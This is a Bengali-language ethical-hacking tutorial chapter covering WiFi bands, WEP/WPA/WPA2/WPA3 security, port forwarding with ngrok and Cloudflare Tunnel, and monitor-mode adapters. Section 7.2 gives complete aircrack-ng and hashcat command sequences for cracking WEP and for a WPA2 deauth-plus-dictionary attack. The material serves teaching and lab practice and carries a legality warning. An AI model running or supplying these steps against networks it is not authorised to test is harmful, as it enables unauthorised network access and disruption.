# অধ্যায় ৭: WiFi ও Wireless Networking

## সহজ কথায়:
WiFi হলো অদৃশ্য দড়ি — যা ছাড়াই internet connect করা যায়। কিন্তু এই অদৃশ্য দড়ি ধরে হ্যাকারও তোমার কাছে আসতে পারে।

---

## ৭.১ WiFi কীভাবে কাজ করে

WiFi = Wireless Fidelity। Radio wave-এর মাধ্যমে data transfer করে।

**ফ্রিকোয়েন্সি ব্যান্ড:**

| ব্যান্ড | ফ্রিকোয়েন্সি | Range | Speed | দেওয়াল ভেদ করে? |
|---------|--------------|-------|-------|------------------|
| **2.4 GHz** | 2.4 - 2.4835 GHz | বেশি (১০০মি) | কম (150 Mbps) | ✅ ভালো |
| **5 GHz** | 5.15 - 5.85 GHz | কম (৩০মি) | বেশি (1 Gbps) | ❌ দুর্বল |
| **6 GHz (WiFi 6E)** | 5.925 - 7.125 GHz | কম | খুব বেশি | ❌ দুর্বল |

### WiFi কীভাবে কাজ করে (সংক্ষেপ):
```
১. Router বেতার তরঙ্গ broadcast করে (SSID=নাম)
২. তোমার ডিভাইস SSID দেখে → পাসওয়ার্ড দিয়ে connect
৩. Router তোমার device-এ IP দেয় (DHCP)
৪. Data radio wave-এ রূপান্তরিত → তোমার device-এ পৌঁছায়
৫. Data packet-এ ভাগ → reassemble → তুমি internet দেখো
```

---

## ৭.২ WEP, WPA, WPA2, WPA3 — Security পার্থক্য

| Encryption | বছর | কীভাবে কাজ করে | Secure? | কীভাবে Crack করে? |
|------------|------|---------------|---------|------------------|
| **WEP** | 1997 | RC4 cipher | ❌ অত্যন্ত দুর্বল | ৫ মিনিটে crack |
| **WPA** | 2003 | TKIP + RC4 | ❌ দুর্বল | ১-২ ঘণ্টা |
| **WPA2** | 2004 | AES + CCMP | ⚠️ মাঝারি (তবে crack করা যায়) | Handshake capture → dictionary attack |
| **WPA3** | 2018 | SAE (Simultaneous Auth of Equals) | ✅ বর্তমানে সবচেয়ে secure | এখনও practical crack নেই |

### WEP-এর দুর্বলতা (এতই দুর্বল যে আজও ব্যাংক ব্যবহার করে না):
```bash
# WEP crack করা (Kali Linux এ):
airmon-ng start wlan0         # Monitor mode চালু
airodump-ng wlan0mon          # WiFi network দেখো
airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon  # Capture
aireplay-ng -b XX:XX:XX:XX:XX:XX wlan0mon  # IV generate
aircrack-ng capture-01.cap    # Crack (৫ মিনিট!)

# Output: KEY FOUND! [ 12:34:56:78:9A:BC ]
```

### WPA2 Cracking (স্টেপ বাই স্টেপ):
```bash
# 1. Monitor mode
airmon-ng start wlan0

# 2. Target network দেখো
airodump-ng wlan0mon

# 3. Handshake capture শুরু করো
airodump-ng -c 11 --bssid XX:XX:XX:XX:XX:XX -w handshake wlan0mon

# 4. Deauth attack (ক্লায়েন্ট disconnect করে দেয় → reconnect-এ handshake capture)
aireplay-ng -0 5 -a XX:XX:XX:XX:XX:XX -c YY:YY:YY:YY:YY:YY wlan0mon

# 5. Handshake captured! এখন crack
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap

# অথবা hashcat দিয়ে GPU ব্যবহার করে:
hashcat -m 22000 handshake.hccapx /usr/share/wordlists/rockyou.txt
```

---

## ৭.৩ Port Forwarding — Router ছাড়া কীভাবে

### Port Forwarding কী?
তোমার বাসার Router-এর public IP-তে কেউ request করলে → সেটা তোমার নির্দিষ্ট device-এ পৌঁছায়।

**Real life analogy:** বড় বিল্ডিং-এর নিচে gate-keeper। কেউ "৫ম তলা, রহিম সাহেব" বললে gate-keeper চিঠি পৌঁছে দেয়।

### কেন দরকার?
- নিজের server বানাতে (home web server)
- CCTV remote access
- Game server (Minecraft, etc.)
- SSH remote access

### Router-এ Port Forwarding Setup:

```
Router: http://192.168.1.1
Setup → Port Forwarding / Port Triggering

Port Range: 80 → 80
IP Address: 192.168.1.100 (তোমার PC)
Protocol: TCP
Enable → Save
```

### Port Forwarding ছাড়া bypass:

**ngrok** — Port forwarding না করেই public URL:
```bash
# Windows/Linux/Mac:
ngrok http 80

# Output:
# Forwarding https://abc123.ngrok.io → http://localhost:80
```

**Cloudflare Tunnel (Argo Tunnel):**
```bash
# Better than ngrok (production ready):
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel mydomain.com
cloudflared tunnel run mytunnel
```

---

## ৭.৪ WiFi Adapter — Hacking-এর জন্য Hardware

সব WiFi card hacking-এর জন্য ভালো না। চাই **Monitor Mode** support।

### ভালো Adapter (খরচ ~1000-3000 BDT):
| মডেল | Chipset | Speed | দাম |
|------|---------|-------|-----|
| **Alfa AWUS036ACH** | Realtek RTL8812AU | 867 Mbps | ~3000 BDT |
| **Panda Wireless PAU09** | Ralink RT5572 | 300 Mbps | ~2500 BDT |
| **TP-Link TL-WN722N** | Atheros AR9271 | 150 Mbps | ~1000 BDT |

### Check করো তোমার adapter:
```bash
# Linux এ:
iwconfig
# "Mode:Monitor" দেখলে → compatible

# আরো check:
airmon-ng
```

---

## 💡 ল্যাব এক্সারসাইজ (Virtual Environment এ)

⚠️ **সাবধান!** তোমার নিজের network বা অন্যের network-এ hack করা illegal। Virtual lab-এ practice করো।

```
১. Virtual Machine-এ দুইটা OS বসাও:
   - Kali Linux (hacker)
   - Windows/Linux (target)

২. Target WiFi তৈরি করো (virtual):
   - Router mode চালাও
   - WPA2 encryption

৩. নিচের কাজগুলো করো:
   a) তোমার WiFi network-এর SSID দেখো
   b) কোন encryption ব্যবহার করছে check করো
   c) কোন channel-এ আছে দেখো
   d) কোন client connected দেখো

৪. Command:
   airmon-ng start wlan0
   airodump-ng wlan0mon
```

---

## 📌 মনে রাখো

| Concept | মূল কথা |
|---------|---------|
| **WiFi Bands** | 2.4GHz (রেঞ্জ বেশি), 5GHz (স্পীড বেশি) |
| **WEP** | ৫ মিনিটে crack (ব্যবহার করবে না) |
| **WPA2** | Handshake capture + dictionary attack |
| **WPA3** | এখনকার মতো secure |
| **Port Forwarding** | বাইরে থেকে তোমার device-এ access |
| **Monitor Mode** | WiFi hacking-এর জন্য আবশ্যক |

**পার্ট ৩ শুরু হচ্ছে — Linux, Hacker-এর সবচেয়ে গুরুত্বপূর্ণ অস্ত্র! 🐧**
